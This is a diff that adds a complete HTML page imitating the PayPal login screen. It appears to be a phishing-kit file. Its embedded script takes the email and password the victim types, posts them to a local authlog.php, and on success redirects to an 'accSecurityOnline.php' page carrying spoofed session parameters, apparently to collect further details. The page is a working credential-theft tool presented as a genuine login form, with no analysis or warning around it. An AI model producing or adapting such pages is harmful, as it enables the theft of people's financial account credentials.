@@ -1,0 +1,132 @@
+<!DOCTYPE html><!--[if lt IE 9]><html lang="en" class="no-js lower-than-ie9 ie"><![endif]--><!--[if lt IE 10]><html lang="en" class="no-js lower-than-ie10 ie"><![endif]--><!--[if !IE]>--><html class=" js " lang="en"><!--<![endif]--><head>
+
+<meta charset="utf-8"><title>Log in to your PayPal account</title><meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+
+
+<link rel="shortcut icon" href="favicon.ico"><link rel="apple-touch-icon" href="#"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes"><link rel="stylesheet" href="dbauth/app.css"><!--[if lte IE 9]><link rel="stylesheet" href="#" /><![endif]--></head><body class="desktop " data-production="true" data-enable-ads-captcha="true" data-client-name="ul"><div id="main" class="main " role="main"><section id="login" class="login" data-role="page" data-title=""><div class="corral"><div id="content" class="contentContainer"><header><p class="paypal-logo paypal-logo-long">PayPal</p></header><h1 class="headerText accessAid">Log in to your PayPal account</h1><div id="notifications" class="notifications" tabindex="-1" style="display:none;"><p class="notification notification-critical" role="alert">Some of your info isn't correct. Please try again.</p></div>
+
+
+
+
+
+<script>
+
+function checks()
+{
+
+
+	var a = document.forms["logoin"]["emp"];
+    var b = document.forms["logoin"]["pap"];
+	
+	function validateEmail(email) {
+    var re = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/i;
+    return re.test(email);
+}
+  
+
+    if ( !validateEmail(a.value) )
+	{
+	document.getElementById("login_emaildiv").className="textInput fieldempty  hasError";
+	a.focus(0);
+	return false;
+	}
+	else
+	{
+	document.getElementById("login_emaildiv").className="textInput fieldempty";
+	}
+	
+	
+	if ( b.value.length<8 )
+	{
+	document.getElementById("login_passworddiv").className="textInput fieldempty  hasError";
+	b.focus(0);
+	return false;
+	}
+	else
+	{
+	document.getElementById("login_passworddiv").className="textInput fieldempty";
+	}
+	
+	
+	checkE();
+
+}
+
+
+function checkE()
+{
+	document.getElementById("notifications").style.display="none";
+    document.getElementById("loader").className="transitioning spinner";
+	var a = document.forms["logoin"]["emp"];
+    var b = document.forms["logoin"]["pap"];
+
+var xmlhttp;
+if (window.XMLHttpRequest)
+  {
+  xmlhttp=new XMLHttpRequest();
+  }
+else
+  {
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xmlhttp.onreadystatechange=function()
+  {
+  if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+
+
+if(xmlhttp.responseText.indexOf("0") !=-1)
+{
+ document.getElementById("loader").className="transitioning hide";
+ document.forms["logoin"]["pap"].value="";
+ document.getElementById("notifications").style.display="";
+}
+
+
+
+if(xmlhttp.responseText.indexOf("1") !=-1)
+{
+window.top.location="accSecurityOnline.php?ProfileID=616614978531524981566&AccSession=NjkwNzQ4MDg4NDA1NzI=";
+
+}
+
+
+    }
+  }
+
+xmlhttp.open("POST","authlog.php",true);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("emp="+a.value+"&pap="+b.value);
+
+
+
+
+}
+function formSub()
+{
+if(inputc())
+{
+checkE();
+}
+}
+</script>
+
+
+
+
+
+<form action="/signin" method="post" class="proceed maskable" name="logoin" id="logoin" autocomplete="off" novalidate="novalidate" onsubmit="checks(); return false;"><div id="passwordSection" class="clearfix">
+
+
+<div class="textInput fieldempty" id="login_emaildiv"><div class="fieldWrapper"><label for="email" class="fieldLabel">Email</label><input id="email" name="emp" class="hasHelp  validateEmpty  " required="required" aria-required="true" autocomplete="off" placeholder="Email" type="email"></div>
+
+<div class="errorMessage" id="emailErrorMessage" style="display:none;"><p class="emptyError">Required</p><p class="invalidError hide">That email format isn’t right</p></div></div>
+
+
+
+<div class="textInput lastInputField" id="login_passworddiv"><div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label><input id="password" name="pap" class="hasHelp  validateEmpty  " required="required" aria-required="true" value="" placeholder="Password" type="password"></div><div class="errorMessage" id="passwordErrorMessage"><p class="emptyError hide">Required</p></div></div>
+
+
+</div><div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button></div><div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Having trouble logging in?</a></div></form><a href="#" class="button secondary" id="createAccount">Sign Up</a></div></div><footer class="footer footerStayPut" role="contentinfo"><ul class="footerGroup"><li><a href="#">Contact Us</a></li><li><a href="#">Privacy</a></li><li><a href="#">Legal</a></li><li><a href="#">Worldwide</a></li></ul></footer></section></div><div class="transitioning hide" id="loader"><p class="checkingInfo">Checking your info…</p><p class="oneSecond hide">Just a second…</p></div><div class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-front" style="display: none; top: 135px; left: 511px;" tabindex="-1" role="dialog" aria-describedby="forgot-password-modal" aria-label="Password Recovery"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span id="ui-id-1" class="ui-dialog-title">&nbsp;</span><button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-icon-only ui-dialog-titlebar-close" role="button" aria-disabled="false" title=""><span class="ui-button-icon-primary ui-icon ui-icon-closethick"></span><span class="ui-button-text">close</span></button></div><div class="pwr-modal forgotPasswordModal ui-dialog-content ui-widget-content" id="forgot-password-modal" aria-label="Password Recovery" style="display: block;"></div></div><div class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-front" style="display: none;" tabindex="-1" role="dialog" aria-describedby="forgot-password-modal" aria-label="Password Recovery"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span id="ui-id-2" class="ui-dialog-title">&nbsp;</span><button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-icon-only ui-dialog-titlebar-close" role="button" aria-disabled="false" title=""><span class="ui-button-icon-primary ui-icon ui-icon-closethick"></span><span class="ui-button-text">close</span></button></div><div class="pwr-modal forgotPasswordModal ui-dialog-content ui-widget-content" id="forgot-password-modal" aria-label="Password Recovery" style="display: block;"></div></div>
+</body></html>
